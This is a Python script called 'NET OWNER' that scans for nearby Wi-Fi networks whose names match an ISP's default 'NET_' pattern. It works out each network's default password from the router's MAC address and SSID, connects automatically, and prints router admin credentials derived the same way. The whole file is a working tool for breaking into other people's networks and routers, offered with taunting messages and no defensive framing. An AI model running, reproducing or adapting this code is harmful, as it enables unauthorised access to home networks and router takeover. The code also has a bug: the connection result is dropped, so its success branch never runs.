import subprocess
import argparse
from re import compile
from wifi import Cell, Scheme


'''
NET OWNER 0.3v
'''

AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/\
                Versions/A/Resources/airport"


class NETOwner():
    def __init__(self, mode, iface, regex="^NET_",
                 airport=AIRPORT_PATH, verbosity=1):
        self.mode = mode
        self.iface = iface
        self.regex = compile(regex)
        self.airport = airport
        self.verbosity = verbosity

    def osx_networks(self):
        scan = ''
        while scan == '':  # for some reason airport fails randomly
            scan = subprocess.check_output([self.airport, "scan"])
            # scan the area for wifi

        scan = scan.split("\n")
        scan.pop(0)

        for wifi in scan:
            obj = [_f for _f in wifi.split(" ") if _f]
            yield obj

    def linux_networks(self):
        scan = Cell.all(self.iface)
        for wifi in scan:
            obj = [wifi.ssid, wifi.address, wifi.signal, wifi.channel, wifi]
            yield obj

    def scan_network(self):
        if self.mode == 'osx':
            scanner = self.osx_networks()
        else:
            scanner = self.linux_networks()

        results = []
        for wifi in scanner:
            # match NET's default SSID
            if self.regex.search(wifi[0]) is not None:
                print("Found WIFI!")
                # the password consists of CM_MAC last 4 hexas of the router,
                # which are the third hexa of the BSSID
                # plus the last 3 hexas of the SSID

                chunks = [
                    ''.join(wifi[1].upper().split(":")[2:3]),
                    wifi[0].split("_")[1][2:]
                ]

                password = ''.join(chunks)
                results.append([wifi[0], password, wifi[1]])

                if self.mode != 'osx':
                    Scheme.for_cell(
                        self.iface, wifi[1], wifi[4], password
                    ).save()

        return results

    def connect_net(self, wifi):
        if self.mode == 'osx':
            self.connect_net_osx(wifi)
        else:
            self.connect_net_linux(wifi)

    def connect_net_osx(self, wifi):
            connect = subprocess.check_output([
                "networksetup", "-setairportnetwork",
                self.iface, wifi[0], wifi[1]
            ])

            if self.verbosity > 0:
                print(connect)

            return "Failed" not in connect

    def connect_net_linux(self, wifi):
        Scheme.find(self.iface, wifi[1]).activate()

    def own(self):
        wifi_available = self.scan_network()

        if len(wifi_available) == 0:
            print("No NET WiFi available :'(")
        else:
            for wifi in wifi_available:
                print("WI-FI: " + wifi[0])
                print("Password: " + wifi[1])
                print("Trying to connect...")
                if self.connect_net(wifi):
                    print("Connected! Have fun (:")
                    if self.verbosity > 0:
                        print("Admin credentials of the router: ")
                        print("User: " + wifi[0])
                        print("Password: NET_" + wifi[1][2:])
                        # the password is the full CM_MAC
                        print("Yeah, I know...")
                    return
                else:
                    print("Nope :(")


def parse_args():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-m", "--mode", default="linux",
                        help="Mode: osx or linux.")
    parser.add_argument("-i", "--interface", default="wlp3s0",
                        help="Network interface.")
    parser.add_argument("-r", "--regex", default="^NET_",
                        help="Regular expression to match networks.")
    parser.add_argument("-a", "--airport", default=AIRPORT_PATH,
                        help="Airport program path.")
    parser.add_argument("-v", "--verbosity", action="count",
                        help="Increase output verbosity.")
    args = parser.parse_args()

    return args


def main():
    print("NET OWNER v0.3")
    print("≈≈≈≈≈≈≈≈≈≈≈≈≈≈")

    args = parse_args()

    owner = NETOwner(
        args.mode,
        args.interface,
        args.regex,
        airport=args.airport,
        verbosity=args.verbosity
    )

    owner.own()


if __name__ == "__main__":
    main()
